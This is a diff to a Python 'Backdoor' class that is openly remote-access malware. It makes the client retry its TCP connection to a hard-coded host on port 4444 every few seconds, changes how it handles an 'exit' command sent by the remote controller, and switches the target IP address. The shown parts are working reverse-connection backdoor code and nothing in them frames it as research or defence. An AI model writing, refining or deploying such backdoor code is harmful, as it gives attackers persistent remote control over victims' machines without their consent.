@@ -21,14 +21,16 @@ class Backdoor:
 
 
 	def connect(self):
-		while not self.connected:
-			try:
-				self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				self.connection.connect((self.ip, self.port))
-				self.connected = True
-				print("[+] Connected")
-			except:
-				time.sleep(3)
+		while True:
+			if not self.connected:
+				print("try connect")
+				try:
+					self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+					self.connection.connect((self.ip, self.port))
+					self.connected = True
+					print("[+] Connected")
+				except:
+					time.sleep(3)
 
 
 	def reliable_send(self, data):
@@ -49,17 +51,15 @@ class Backdoor:
 		while True:
 			if self.connected:
 				command = self.reliable_recive()
-				
 				if command == "exit":
-					print("im here")
-					self.connection.close()
-					self.connectd = False
-					break
+					print(command)
+					self.reliable_send("")
+					self.connected = False
 
 
 
 if __name__ == "__main__":
-	backdoor = Backdoor("192.168.0.199", 4444)
+	backdoor = Backdoor("192.168.0.108", 4444)
 
 	backdoor_thread = threading.Thread(target=backdoor.connect)
 	backdoor_thread.start()
